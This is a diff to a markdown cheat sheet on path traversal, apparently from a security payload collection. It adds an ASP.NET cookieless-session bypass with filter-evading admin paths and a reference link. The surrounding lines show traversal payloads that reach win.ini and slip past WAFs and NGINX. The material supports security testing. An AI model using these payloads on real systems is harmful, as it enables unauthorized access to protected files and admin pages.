@@ -13,6 +13,7 @@
     * [Double URL encoding](#double-url-encoding)
     * [UNC Bypass](#unc-bypass)
     * [NGINX/ALB Bypass](#nginxalb-bypass)
+    * [ASPNET Cookieless Bypass](#aspnet-cookieless-bypass)
 * [Path Traversal](#path-traversal)
     * [Interesting Linux files](#interesting-linux-files)
     * [Interesting Windows files](#interesting-windows-files)
@@ -72,6 +73,7 @@ Sometimes you encounter a WAF which remove the "../" characters from the strings
 http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
 ```
 
+
 ### Double URL encoding
 
 ```powershell
@@ -82,6 +84,7 @@ http://domain.tld/page.jsp?include=..;/..;/sensitive.txt
 
 **e.g:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271) with `http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini`
 
+
 ### UNC Bypass
 
 An attacker can inject a Windows UNC share ('\\UNC\share\name') into a software system to potentially redirect access to an unintended location or arbitrary file.
@@ -90,6 +93,7 @@ An attacker can inject a Windows UNC share ('\\UNC\share\name') into a software 
 \\localhost\c$\windows\win.ini
 ```
 
+
 ### NGINX/ALB Bypass
 
 NGINX in certain configurations and ALB can block traversal attacks in the route, For example:
@@ -97,6 +101,21 @@ NGINX in certain configurations and ALB can block traversal attacks in the route
 
 To bypass this behaviour just add forward slashes in front of the url:
 ```http://nginx-server////////../../```
+
+
+### ASPNET Cookieless Bypass
+
+When cookieless session state is enabled. Instead of relying on a cookie to identify the session, ASP.NET modifies the URL by embedding the Session ID directly into it.
+
+For example, a typical URL might be transformed from: `http://example.com/page.aspx` to something like: `http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx`. The value within `(S(...))` is the Session ID. 
+
+We can use this behavior to bypass filtered URLs.
+
+```powershell
+/admin/(S(X))/main.aspx
+/admin/Foobar/(S(X))/../(S(X))/main.aspx
+/(S(X))/admin/(S(X))/main.aspx
+```
 
 
 ### Java Bypass
@@ -210,3 +229,4 @@ The following log files are controllable and can be included with an evil payloa
 * [CWE-40: Path Traversal: '\\UNC\share\name\' (Windows UNC Share) - CWE Mitre - December 27, 2018](https://cwe.mitre.org/data/definitions/40.html)
 * [NGINX may be protecting your applications from traversal attacks without you even knowing](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d?source=friends_link&sk=e9ddbadd61576f941be97e111e953381)
 * [Directory traversal - Portswigger](https://portswigger.net/web-security/file-path-traversal)
+* [Cookieless ASPNET - Soroush Dalili](https://twitter.com/irsdl/status/1640390106312835072)
